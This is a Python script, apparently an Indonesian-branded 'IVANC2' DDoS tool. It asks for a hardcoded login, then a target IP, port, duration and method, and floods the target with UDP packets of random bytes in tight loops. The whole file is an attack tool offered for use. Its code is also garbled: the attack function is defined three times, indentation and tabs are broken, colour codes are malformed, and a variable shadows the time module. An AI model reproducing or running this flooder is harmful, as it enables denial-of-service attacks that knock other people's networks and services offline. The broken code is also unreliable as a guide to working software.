import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m

██╗░░██╗░█████╗░██╗░░░██╗██████╗░
╚██╗██╔╝██╔══██╗██║░░░██║╚════██╗
░╚███╔╝░███████║╚██╗░██╔╝░░███╔═╝
░██╔██╗░██╔══██║░╚████╔╝░██╔══╝░░
██╔╝╚██╗██║░░██║░░╚██╔╝░░███████╗
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
""")

username = str(input("\033[94m[IVANC2] \033[93mUsername:"))
password = str(input("\033[94m[IVANC2] \033[93mPassword:"))
if password == "IVANC2" and username == "IVANC2":
    print ("Telah Masuk Sebagai IvanC2")
    time.sleep(2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)


nicknm = "IVANC2"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[94m

██████████████████████████████████████████
█▄─▀█▀─▄█▄─▄▄─█─▄─▄─█─█─█─▄▄─█▄─▄▄▀█─▄▄▄▄█
██─█▄█─███─▄█▀███─███─▄─█─██─██─██─█▄▄▄▄─█
▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀
""")
print("""\033[92m
| UDP             |
| OVH             |
| UDP-DOWN        |
| TCP             |
———————————————————
""")

ip = str(input("\033[94m====> ★ Enter The Targer IP   : "))
port = int(input("\033[94====> $ Enter The Target PORT   : "))
time = int(input("\033[94====> $ Enter The Target PACKET   : "))
threads = int(input("\033[94====> $ Enter The Target THREADS   : "))
choice = str(input("\033[94====> ★ Enter The Target METHODS   : "))

os.system("clear")

brand = """\033[94m
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████

\033[91m     PUNYA IVANC2🌹IVANC2
"""

os.system("clear")

def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IVAN X TRANSFORMER EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(500055, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IVAN X TRANSFORMER EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(500055, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
    def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IVAN X TRANSFORMER EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(16, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")

def randsender(host, timer, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1
              
              


def stdsender(host, port, timer, payload):
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp
    
    

if __name__ == '__main__':
    try:
        if choice == 'UDP':
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
	if choice == 'UDPDOWN':
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
	if choice == 'OVH':
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
	if choice == 'TCP':
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
	if choice == 'OVHKILL':
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
		attack(ip, port, time, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')